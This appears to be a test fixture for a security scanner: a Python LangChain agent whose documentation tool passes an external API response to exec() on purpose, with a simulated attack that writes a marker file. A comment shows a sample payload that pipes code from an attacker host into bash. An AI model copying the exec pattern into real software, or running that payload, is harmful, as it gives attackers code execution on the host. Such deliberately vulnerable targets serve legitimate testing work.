"""
Vulnerable Agent 1: The Document Generator
===========================================
A LangChain agent with an intentional Code Injection vulnerability.

VULNERABILITY: The `generate_documentation` tool fetches a code template from an
external API and passes it directly to exec() without ANY validation.
An attacker who controls the API endpoint can execute arbitrary code on the host.

For MORPHEUS security testing demonstration purposes only.
"""

import os
import requests
from typing import Any

from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.tools import tool
from langchain_groq import ChatGroq


# ---------------------------------------------------------------------------
# VULNERABLE TOOL DEFINITIONS
# ---------------------------------------------------------------------------

@tool
def generate_documentation(topic: str) -> str:
    """
    Generates documentation for a given topic by fetching a code template
    from an external API and executing it to produce structured output.

    Args:
        topic: The topic to generate documentation for.

    Returns:
        The generated documentation as a string.
    """
    api_endpoint = os.getenv("DOC_GENERATOR_API", "https://api.example.com/v1/templates")

    try:
        # Simulates fetching a dynamic template from an external source.
        # In production this would be a real HTTP call.
        response = _mock_api_response(topic)
    except requests.RequestException as e:
        return f"Error contacting API: {e}"

    # =========================================================================
    # ⚠️  VULNERABILITY: CODE INJECTION
    # The API response is executed directly without any sanitization.
    # An attacker controlling the API can return malicious code like:
    #   __import__('os').system('curl attacker.com | bash')
    # =========================================================================
    exec(response)  # VULNERABLE LINE - DO NOT USE IN PRODUCTION

    return f"Documentation generated for topic: {topic}"


def _mock_api_response(topic: str) -> str:
    """
    Simulates an external API response.
    In a real attack scenario, this would return malicious code.
    """
    if topic == "__ATTACK__":
        # Simulate a malicious payload from an attacker-controlled API
        return '__import__("os").system("echo [MORPHEUS] Code Injection Successful > injected.txt")'
    return f'print("# Documentation for: {topic}\\nGenerated at runtime.")'


@tool
def summarize_code(code_snippet: str) -> str:
    """
    Summarizes what a given code snippet does.

    Args:
        code_snippet: A string of Python code to summarize.

    Returns:
        A plain-English summary of the code.
    """
    # This tool is safe — it does not execute any code
    lines = code_snippet.strip().splitlines()
    return f"Code snippet with {len(lines)} lines. First line: '{lines[0] if lines else 'empty'}'"


# ---------------------------------------------------------------------------
# AGENT SETUP
# ---------------------------------------------------------------------------

def build_agent() -> AgentExecutor:
    """Build and return the vulnerable LangChain agent."""
    llm = ChatGroq(
        model="llama-3.1-8b-instant",
        api_key=os.getenv("GROQ_API_KEY"),
        temperature=0,
    )

    tools = [generate_documentation, summarize_code]

    prompt = ChatPromptTemplate.from_messages([
        ("system", (
            "You are a helpful documentation assistant. "
            "Use the available tools to generate and summarize documentation."
        )),
        ("human", "{input}"),
        ("placeholder", "{agent_scratchpad}"),
    ])

    agent = create_tool_calling_agent(llm, tools, prompt)
    return AgentExecutor(agent=agent, tools=tools, verbose=True)


# ---------------------------------------------------------------------------
# ENTRYPOINT
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    agent_executor = build_agent()

    # Normal operation
    print("=== Normal Operation ===")
    result = agent_executor.invoke({"input": "Generate documentation for Python decorators"})
    print(result["output"])

    # Simulated attack scenario (demonstrates the vulnerability)
    print("\n=== Simulating Attack Scenario ===")
    result = agent_executor.invoke({"input": "Generate documentation for __ATTACK__"})
    print(result["output"])
